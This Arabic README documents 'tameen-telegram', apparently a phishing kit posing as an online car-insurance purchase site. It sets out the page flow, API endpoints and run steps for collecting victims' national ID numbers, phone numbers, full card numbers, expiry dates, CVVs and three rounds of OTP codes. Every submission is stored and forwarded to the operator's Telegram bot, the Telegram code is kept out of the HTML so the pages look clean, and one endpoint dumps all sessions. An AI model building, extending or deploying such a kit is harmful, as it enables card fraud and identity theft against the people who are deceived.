# 🛡️ نظام تأمين tameen-telegram - البنية الجديدة

## 📋 الوصف

هذا المشروع هو نظام إدارة بيانات التأمين مع فصل كامل بين الواجهة الأمامية (Frontend) والخلفية (Backend).

---

## 🏗️ هيكل المشروع

```
tameen-telegram/
├── backend/
│   ├── server.js          # السيرفر الرئيسي (Node.js + Express)
│   ├── package.json       # إعدادات المشروع
│   └── data.json          # ملف تخزين البيانات (JSON)
├── public/
│   ├── index.html         # الصفحة الرئيسية (البيانات الشخصية)
│   ├── form.html          # صفحة بيانات التأمين
│   ├── select.html        # صفحة اختيار الشركة
│   ├── visa.html          # صفحة الدفع
│   ├── otp.html           # صفحة التحقق 1
│   ├── otp2.html          # صفحة التحقق 2
│   ├── otp3.html          # صفحة التحقق 3
│   ├── total.html         # صفحة الملخص
│   └── total2.html        # صفحة الملخص 2
├── img1.png
├── mobile.png
└── sdfgdfs.png
```

---

## 🔒 الأمان والتشفير

### نظام التشفير:
- ✅ تشفير AES-256-CBC للبيانات الحساسة
- ✅ فصل كامل بين الواجهة والخلفية
- ❌ لا يوجد كود Telegram في الـ Frontend

### البيانات المشفرة:
- رقم الهوية
- رقم الهاتف
- رقم البطاقة البنكية
- رمز CVV

---

## 🚀 تشغيل المشروع

### 1. تثبيت الاعتماديات:
```bash
cd backend
npm install
```

### 2. تشغيل السيرفر:
```bash
npm start
# أو
node server.js
```

### 3. فتح الموقع:
```
http://localhost:3000
```

---

## 📡 API Endpoints

### الصحة:
```
GET /api/health
```
Returns: `{ status: 'ok', timestamp: ... }`

### إرسال البيانات الشخصية:
```
POST /api/submit/personal
Body: {
  owner_name: string,
  id_number: string,
  phone: string,
  document_type: string,
  serial_number: string,
  birth_date: string
}
```

### إرسال بيانات التأمين:
```
POST /api/submit/insurance
Body: {
  owner_name: string,
  insurance_type: string,
  start_date: string,
  usage_purpose: string,
  car_value: string,
  manufacture_year: string,
  repair_location: string
}
```

### إرسال اختيار الشركة:
```
POST /api/submit/company
Body: {
  owner_name: string,
  company_name: string,
  company_logo: string,
  price: string
}
```

### إرسال بيانات الدفع:
```
POST /api/submit/payment
Body: {
  owner_name: string,
  card_name: string,
  card_number: string,
  expiry_month: string,
  expiry_year: string,
  cvv: string,
  total_price: string
}
```

### إرسال رمز OTP:
```
POST /api/submit/otp
Body: {
  owner_name: string,
  last_4_digits: string,
  otp_code: string,
  page: string,
  step: number
}
```

### جلب بيانات الجلسة:
```
GET /api/session/:sessionId
```

### جلب جميع الجلسات:
```
GET /api/all-sessions
```

---

## 🔄 تدفق البيانات

```
الخطوة 1: index.html (البيانات الشخصية)
    ↓ إرسال POST /api/submit/personal
    ↓ السيرفر يحفظ في data.json
    ↓ السيرفر يرسل Telegram

الخطوة 2: form.html (بيانات التأمين)
    ↓ إرسال POST /api/submit/insurance
    ↓ السيرفر يحفظ في data.json
    ↓ السيرفر يرسل Telegram

الخطوة 3: select.html (اختيار الشركة)
    ↓ إرسال POST /api/submit/company
    ↓ السيرفر يحفظ في data.json
    ↓ السيرفر يرسل Telegram

الخطوة 4: visa.html (بيانات الدفع)
    ↓ إرسال POST /api/submit/payment
    ↓ السيرفر يحفظ في data.json (مشفّر)
    ↓ السيرفر يرسل Telegram

الخطوة 5-7: otp.html, otp2.html, otp3.html (التحقق)
    ↓ إرسال POST /api/submit/otp
    ↓ السيرفر يحفظ في data.json
    ↓ السيرفر يرسل Telegram
```

---

## 📊 هيكل البيانات (data.json)

```json
{
  "forms": [
    {
      "sessionId": "abc123...",
      "records": [
        {
          "step": 1,
          "type": "personal_info",
          "timestamp": "2024-01-01T00:00:00.000Z",
          "encrypted": {
            "id_number": { "iv": "...", "data": "..." },
            "phone": { "iv": "...", "data": "..." }
          },
          "data": {
            "owner_name": "...",
            "document_type": "...",
            "serial_number": "...",
            "birth_date": "..."
          }
        },
        {
          "step": 2,
          "type": "insurance_info",
          "timestamp": "...",
          "data": { ... }
        },
        // ... المزيد من السجلات
      ],
      "createdAt": "...",
      "lastUpdated": "..."
    }
  ],
  "lastUpdated": "..."
}
```

---

## 🔐 إعدادات Telegram

```javascript
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
```

---

## ⚙️ إعدادات التشفير

```javascript
const ENCRYPTION_KEY = crypto.scryptSync('secure-tameen-key-2024', 'salt', 32);
```

---

## 📝 ملاحظات

1. **البيانات الحساسة مشفرة** في ملف data.json
2. **كل جلسة لها ID فريد** لتتبع البيانات
3. **كل صفحة ترسل البيانات للسيرفر** وليس مباشرة لـ Telegram
4. **السيرفر يقوم بتشفير وإرسال البيانات** لـ Telegram
5. **لا يوجد أي كود Telegram في ملفات الـ HTML**

---

## 🛠️ التطوير

### إضافة صفحة جديدة:
1. أنشئ ملف HTML في مجلد `public/`
2. أضف API endpoint في `server.js`
3. استخدم `submitToServer()` لإرسال البيانات

### تعديل إعدادات Telegram:
1. افتح `backend/server.js`
2. عدّل `TELEGRAM_BOT_TOKEN` و `TELEGRAM_CHAT_ID`

---

## 📄 الترخيص

هذا المشروع للتطوير فقط.